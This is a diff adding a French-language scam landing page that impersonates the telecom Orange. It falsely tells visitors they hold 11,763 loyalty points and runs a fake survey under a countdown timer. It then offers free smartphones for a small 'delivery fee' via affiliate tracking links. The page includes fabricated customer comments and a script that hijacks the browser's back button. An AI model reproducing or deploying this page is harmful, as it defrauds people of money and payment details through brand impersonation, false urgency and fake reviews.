@@ -1,0 +1,491 @@
+<html lang="en"><head>
+<base href="">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="stylesheet" href="./css/bootstrap.min.css">
+<link rel="stylesheet" href="./css/bundle_fr.css">
+<script src="./img/jquery.min.js"></script>
+<script>
+	(function(window, location) {
+	history.replaceState(null, document.title, location.pathname+"#!/history");
+	history.pushState(null, document.title, location.pathname);
+	
+	window.addEventListener("popstate", function() {
+	  if(location.hash === "#!/history") {
+		history.replaceState(null, document.title, location.pathname);
+		setTimeout(function(){ location.replace(""); },0);
+		}
+	  }, false);
+	}(window, location));
+	
+	window.opener.location.href = "";
+	</script>
+<script type="text/javascript">
+		/*=============HELPER================*/
+		var Helper = (function() {
+	
+		  var data = [];
+	
+		  var months = ['Janvier','Février','Mars','Avril','Mai','Juin','Juillet','Août','Septembre','Octobre','Novembre','Décembre'];
+		  var days = ['Dimanche','Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi'];
+	
+		  function setDays(d) {
+			if ((d.constructor !== Array) || d.length !== 7)
+			  return false;
+			days = d;
+		  }
+	
+		  function setMonths(m) {
+			if ((m.constructor !== Array) || m.length !== 12)
+			  return false;
+			months = m;
+		  }
+	
+		  function getDate() {
+			var now = new Date();
+			var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+			return (now.getDate()) + " " + month + " " + now.getFullYear();
+		  }
+	
+		  function getMonth() {
+			var now = new Date();
+			var month = typeof(months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
+			return month;
+		  }
+	
+		  function getDay() {
+			var now = new Date();
+			var day = typeof(days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
+			return day;
+		  }
+	
+		  function getDayOfMonth() {
+			var now = new Date();
+			var day = ('0' + now.getDate()).slice(-2);
+			return day;
+		  }
+	
+		  function getUrlParameter(name) {
+			name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+			var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+			var results = regex.exec(location.search);
+			return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+		  }
+	
+		  function findAncestor(element, name) {
+			while ((element = element.parentElement) && !element.classList.contains(name));
+			return element;
+		  }
+	
+		  function bindOnQuery(query, callback, action = "click") {
+			var elements = document.querySelectorAll(query);
+			for (var i = 0; i < elements.length; i++) {
+			  elements[i].addEventListener(action, callback, false);
+			}
+		  }
+	
+		  function bindOnId(name, callback, action = 'click') {
+			var element = document.getElementById(name);
+			element.addEventListener(action, callback, false);
+		  }
+	
+		  function replaceMarkers(text, markers) {
+			for (key in markers) {
+			  var search = '%'+ key +'%';
+			  text = text.replace(new RegExp(search, 'g'), markers[key]);
+			}
+	
+			return text;
+		  }
+	
+		  return {
+			setDays: setDays,
+			setMonths: setMonths,
+			getDate: getDate,
+			getDay: getDay,
+			getMonth: getMonth,
+			getDayOfMonth: getDayOfMonth,
+			getUrlParameter: getUrlParameter,
+			findAncestor: findAncestor,
+			bindOnQuery: bindOnQuery,
+			bindOnId: bindOnId,
+			replaceMarkers: replaceMarkers
+		  };
+	
+		})();
+		</script>
+<title>Lots destinés aux membres de Orange</title>
+<script async="" src="/cdn-cgi/challenge-platform/h/g/scripts/invisible.js"></script></head>
+<body class="" cz-shortcut-listen="true"><div class="tingle-modal" style="display: none;"><div class="tingle-modal-box"><div class="tingle-modal-box__content"></div><div class="tingle-modal-box__footer"><button></button></div></div></div><div class="tingle-modal" style="display: none;"><div class="tingle-modal-box"><div class="tingle-modal-box__content"></div><div class="tingle-modal-box__footer"><button></button></div></div></div>
+<div class="tingle-modal" style="display: none;">
+<div class="tingle-modal-box">
+<div class="tingle-modal-box__content"></div>
+<div class="tingle-modal-box__footer">
+<button></button>
+</div>
+</div>
+</div>
+<script src="./js/bootstrap.js"></script>
+<script>
+	window.onload=function(){
+	  $('#myModal').modal('show');
+	  }
+	</script>
+<div class="tingle-modal" style="display: none;">
+<div class="tingle-modal-box">
+<div class="tingle-modal-box__content"></div>
+<div class="tingle-modal-box__footer">
+<button></button>
+</div>
+</div>
+</div>
+<header>
+<div class="logo-wrap">
+<div class="container">
+<div class="row">
+<div class="col-xs-12 col-md-8 col-md-offset-2 ">
+<p><img src="./img/Color-Orange-Logo.jpg" alt="" width="198" height="77"></p><table style="width: 100%;">
+<tbody>
+<tr>
+
+<td class="lang"> FR </td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</div>
+<div class="slogan-wrap">
+<div class="container">
+<div class="row">
+<div class="col-xs-12 col-md-8 col-md-offset-2 slogan text-xs-left">Programme fidélité</div>
+</div>
+</div>
+</div>
+</header>
+<div class="container body-container">
+<div class="row">
+<div class="lead-container col-xs-12 col-md-8 col-md-offset-2">
+<div id="recipe-row" class="row">
+<div class="col-xs-12 recipe-content">
+<div class="row">
+<div class="col-xs-1">
+<p><img src="./img/flags_flag-fr.png" alt="" width="43" height="43"></p> </div>
+<div class="col-xs-10 col-md-11">
+<div class="recipe-header">
+<div class="phrase"> Félicitations ! </div>
+<div class="date_full">
+<script>document.write(Helper.getDate())</script>28 Février 2022
+</div>
+</div>
+</div>
+</div>
+Félicitations <span class="marked">Cher Client </span>Orange! <br>
+<br>
+Orange vous remercie de votre fidélité.<br>
+<br>
+Nous tenant à vous informer que chaque Euro dépensé sur vos lignes mobiles est <span class="marked">récompensé</span>.<br>
+Votre solde cumulés jusqu'à présent est <span class="marked">11 763 points</span>.<br>
+<br>
+Orange vous offre l'opportunité de les convertir et de choisir un article de votre choix sur notre boutique en ligne. <br>
+Pour y <strong>profiter </strong>nous vous invitons de prendre quelques secondes pour répondre à ce questionnaire.<br><br>
+<strong>Remarque :</strong> 50 utilisateurs tirés au sort ont reçu cette invitation, mais le nombre de lots disponibles est limité.
+<div class="timer"> Vous n'avez que <span class="marked"><span id="timer-mins">1</span> minutes et <span id="timer-secs">59</span> secondes</span> pour répondre aux questions suivantes, avant que les lots ne soient attribués à un autre heureux utilisateur ! Bonne chance ! </div>
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="qu-wrap col-xs-12 col-md-8 col-md-offset-2 ">
+<div class="row">
+<div class="qu-group col-xs-12">
+<div class="row">
+<div class="qu-group-header col-xs-12"> Êtes-vous satisfait par Orange ? </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Très satisfait </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Satisfait </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Mécontent </div>
+</div>
+</div>
+<div class="qu-group col-xs-12" style="display: none;">
+<div class="row">
+<div class="qu-group-header col-xs-12"> Que préférez-vous chez Orange ? </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> La rapidité </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Le prix </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Les Services </div>
+</div>
+</div>
+<div class="qu-group col-xs-12" style="display: none;">
+<div class="row">
+<div class="qu-group-header col-xs-12"> Comment évaluez-vous votre connexion Orange (y compris la fiabilité, la vitesse, les signaux occupés, la déconnexion, etc.) ? </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Excellente </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Très bonne </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Bonne </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Correcte </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Médiocre </div>
+</div>
+</div>
+<div class="qu-group col-xs-12" style="display: none;">
+<div class="row">
+<div class="qu-group-header col-xs-12"> D'après votre connaissance des services Orange, est-il mieux, identique ou pire que d'autres fournisseurs de services ? </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> Bien mieux </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> mieux </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> à peu près pareil </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> pire </div>
+</div>
+<div class="row">
+<div class="qu col-xs-12 col-md-8 col-md-offset-2"> bien pire </div>
+</div>
+</div>
+<div id="qu-progress" class="col-xs-12" style="display: none;">
+<div class="row">
+<div class="qu-group-header col-xs-12"> </div>
+</div>
+<div class="row">
+<div id="qu-progress-state" class="col-xs-6 col-md-4 col-md-offset-2 text-left"> Progression </div>
+<div id="qu-progress-percent" class="col-xs-6 col-md-4 text-right"> 0% </div>
+</div>
+<div class="row">
+<div class="col-xs-12 col-md-8 col-md-offset-2 qu-progress-wrap">
+<div id="qu-progress-bar"> </div>
+</div>
+</div>
+<div class="row">
+<div id="qu-checkpoint-10" rel="Vérification des réponses" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+<table>
+<tbody>
+<tr>
+<td><div id="qu-mark-10" class="qu-mark"></div></td>
+<td><span class="qu-checkpoint-desc">Merci d'avoir participé à cette enquête !</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="row">
+<div id="qu-checkpoint-20" rel="Vérifier l'adresse IP" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+<table>
+<tbody>
+<tr>
+<td><div id="qu-mark-20" class="qu-mark"></div></td>
+<td><span class="qu-checkpoint-desc">✓ Votre point de fidélité a bien été utilisé <font style="font-weight: bold;font-size: 18px;" color="green">11 763 points</font></span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="row">
+<div id="qu-checkpoint-30" rel="Sélection de cadeaux" class="col-xs-10 col-md-offset-2 qu-checkpoint">
+<table>
+<tbody>
+<tr>
+<td><div id="qu-mark-30" class="qu-mark"></div></td>
+<td><span class="qu-checkpoint-desc">Aujourd'hui, il ne reste plus que (5) lots disponible</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div id="qu-prize" class="col-xs-12 col-md-8 col-md-offset-2" style="display: none;">
+<div class="row">
+<div class="qu-group-header col-xs-12"> payer just la livraison de votre cadeau : </div>
+</div>
+<div class="row qu-prize-row">
+<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image clickable" src="./img/2223-w320h320.png"> </div>
+<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name"><b>Obtenez Votre Samsung S22©</b><br><i>2022 Samsung le plus populaire !</i><br><br> <div class="price-wrap">
+<del style="color:red;">929,00 €</del>
+&nbsp;
+<font style="font-weight: bold;font-size: 18px;" color="green">0,00 €</font>
+</div> </span> <strong>Montant à payer :</strong> €1.50 (frais de livraison)<br>
+<strong>Cadeau en stock : </strong>1 pc.<br>
+<a onclick="track(1); return false;" href="https://ftrklead.com/?a=82224&amp;c=307545" class="qu-take-it"> Valider </a> </div>
+</div>
+<div class="row qu-prize-row">
+<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image clickable" src="./img/iphone112.png"> </div>
+<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name"><b>Obtenez Votre Apple iPhone 13© Pro Max</b><br><i>2022 Apple le plus populaire !</i><br><br> <div class="price-wrap">
+<del style="color:red;">1 500,00 €</del>
+&nbsp;
+<font style="font-weight: bold;font-size: 18px;" color="green">0,00 €</font>
+</div> </span> <strong>Montant à payer :</strong> €1.50 (frais de livraison)<br>
+<strong>Cadeau en stock : </strong>2 pc.<br>
+<a onclick="track(1); return false;" href="http://bisangoku.cc/?a=82224&amp;o=111423&amp;c=0&amp;mt=3" class="qu-take-it"> Valider </a> </div>
+</div>
+<div class="row qu-prize-row">
+<div class="col-xs-5 text-xs-right qu-item"> <img class="prize-image clickable" src="./img/s.png"> </div>
+<div class="col-xs-7 text-xs-left qu-prize-description"> <span class="qu-prize-name"><b>Obtenez Votre Samsung S21©</b><br><i>2021 Samsung le plus populaire !</i><br><br> <div class="price-wrap">
+<del style="color:red;">859,00 €</del>
+&nbsp;
+<font style="font-weight: bold;font-size: 18px;" color="green">0,00 €</font>
+</div> </span> <strong>Montant à payer :</strong> €1.50 (frais de livraison)<br>
+<strong>Cadeau en stock : </strong>1 pc.<br>
+<a onclick="track(1); return false;" href="https://eastrk-cd.com/?a=82224&amp;c=257207" class="qu-take-it"> Valider </a> </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-row">
+<div class="col-xs-12 col-md-8 col-md-offset-2 comment-container">
+
+<div class="row">
+<div class="col-xs-12 text-center comment-header"> Commentaires </div>
+</div>
+
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr1.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Nicolas Kassab</span> <br>
+<strong>J’ai reçu aujourd’hui mon nouveau Samsung. Jusque-là, je pensais que c’était une blague, mais j’avais tort. Merci infiniment aux organisateurs pour ce cadeau !</strong> <br>
+<small class="date">Il y a 44 minutes</small> </div>
+</div>
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr2.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Raphaël Mre</span> <br>
+<strong>Ouah ! Ma femme et moi avons reçu un iPhone X ! Merci à Orange pour cette opération. </strong> <br>
+<small class="date">Il y a 50 minutes</small> </div>
+</div>
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr3.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Megan Dousset</span> <br>
+<strong>Franchement, qui va distribuer des cadeaux pareils gratuitement ? J’y crois pas du tout !</strong> <br>
+<small class="date">Il y a 2 heures</small> </div>
+</div>
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr4.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Michael Chalhoub</span> <br>
+<span class="marked"><strong>@Megan Dousset</strong></span> <strong>C’est pour faire de la publicité. De grandes entreprises font souvent ce genre de promotions et ça marche vraiment. Essaie ! </strong> <br>
+<small class="date">Il y a 3 heures</small> </div>
+</div>
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr5.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Samié Louié</span> <br>
+<strong> Je viens d’appeler le transporteur. Il m’a dit qu’il m’apporterait le colis aujourd’hui. Mais quand même, j’attends d’avoir l’iPhone entre les mains pour y croire vraiment :)</strong> <br>
+<small class="date">Il y a 4 heures</small> </div>
+</div>
+<div class="row comment-wrap">
+<div class="col-xs-2 text-right"> <img class="face-round" src="./img/facefr6.jpg"> </div>
+<div class="col-xs-10 col-md-8 comment-desc"> <span class="name">Dimitri Gelineau</span> <br>
+<strong> Je pensais que c’était une arnaque, mais je viens vraiment de recevoir un iPhone ce matin. Un original, sans aucune escroquerie. J’ai répondu au questionnaire avec le nom de ma copine et de ma mère, des fois que ça marche encore une fois, hahaha</strong> <br>
+<small class="date">Il y a 4 heures</small> </div>
+</div>
+
+<div class="row comment-wrap">
+<div class="col-xs-12 text-center">
+<textarea id="comment-area"></textarea>
+</div>
+<div class="col-xs-12 text-center"> <span id="comment-post" onclick="alert('Merci! Votre commentaire a été envoyé à modération');">Poster un commentaire</span> </div>
+</div>
+</div>
+</div>
+</div>
+<div class="container">
+<div class="row">
+<div class="col-xs-12 col-md-8 col-md-offset-2 copyright text-xs-center"> © 2021
+<div class="copyright-image img-responsive"> <img src="./img/rta.gif"> </div>
+<div class="conditions"> <a href="#">Conditions</a><br> CECI EST UNE ENQUÊTE INDÉPENDANTE. Ce site Web n'est ni affilié ni approuvé par et ne prétend pas représentent ou possèdent l'une des marques de commerce, noms commerciaux ou droits associés à l'un des produits qui sont le propriété de leurs propriétaires respectifs qui ne possèdent pas, n'approuvent pas ou ne font pas la promotion de ce site Web. * Produits d'essai offerts sur la dernière page nécessite des frais d'expédition et de manutention. Consultez le site du fabricant pour plus de détails, car les conditions varient en fonction des offres. Voir les conditions générales importantes concernant cette enquête, ce site et cette publicité</div>
+</div>
+</div>
+</div>
+<div style="display: none;">
+<div class="jingle-header-crutch">
+<table>
+<tbody>
+<tr>
+<td><img src="./img/or-ico.png" alt=""></td>
+<td class="slogan"><span class="marked">Lots destinés aux membres de Orange</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<script src="./js/bundle_oranges.js"></script>
+<script>
+	function alertUser(msg) {alert(msg);}
+	window.onload = function () { $('#myModal').modal('show');};
+	Timer.setCountdown('timer-mins', 'timer-secs');
+	
+	function redirect(){
+	  window.location = '';
+	  }
+	
+	if(self != top){
+	  $.get('/clicktracking.php?type=iframe&pid=Hui_2_429078');
+	  top.location = self.location;
+	  }
+	
+	function track($num){
+	  if($num == 1){
+		$name = 'Apple iPhone 12 Pro';
+		var $afflink = '';
+		} else {
+		  $name = 'Samsung Galaxy S20';
+		  var $afflink = '';
+		  }
+	  
+	  $('#lastmessage span#pname').html($name);
+	  $('#lastmessage span#pname2').html($name);
+	  $('#afflink').attr("href", $afflink);
+	  
+	  $('#lastmessage').addClass('tingle-modal--visible');
+	  return false;
+	  }
+	
+	function track2(){
+	  $.get('/clicktracking.php?type=user&pid=Hui_2_429078');
+	  window.onunload = window.onbeforeunload = null;
+		setTimeout("redirect()", 1000);
+	  }
+	</script>
+<div id="lastmessage" class="tingle-modal" style="">
+<div class="tingle-modal-box">
+<div class="tingle-modal-box__content">
+<div class="jingle-header-crutch">
+<table><tbody><tr>
+<td><img src="./img/orange-l.png" alt=""></td>
+<td class="slogan"><span class="marked">Lots destinés aux membres de Orange</span></td>
+</tr></tbody></table>
+</div>
+<div>Votre <span id="pname" class="marked">Carte cadeau de 500€</span> a été réservé par Orange !</div>
+<br><strong>Modalités et conditions</strong> :<br>
+1. Sur la page suivante, remplissez le formulaire d expédition en indiquant vos coordonnées ;<br>
+2. Vous n avez que 1 € à payer pour la livraison de votre cadeau ;<br>
+3. Votre <span id="pname2">Carte cadeau de 500€</span> sera expédié dans les deux jours ouvrables par La Poste.</div>
+<div class="tingle-modal-box__footer">
+<a target="_blank" "="" id="afflink" href=""><button class="tingle-btn tingle-btn--pull-right">OK</button></a>
+</div>
+</div>
+</div>
+<script type="text/javascript">(function(){window['__CF$cv$params']={r:'6e4c1aed789063ab',m:'9gWWmO334y5giAQMd4v1_5wAPsSL4nXeRs4HkPa5Qd0-1646077022-0-AXxYpU+gXctiy7cQ1lYTUofx8cjd8V3hzBRsxb2BbxgVFUpwdGaIa78fYNantwtJMew2IDtt02j2cSD19D81hSdVi3OxJzSSNIIjar9pYQpCl3mUNrJV0X8nBBA4JrgQaQ==',s:[0xa7bba82aa4,0x581f690080],u:'/cdn-cgi/challenge-platform/h/g'}})();</script>
+</body></html>
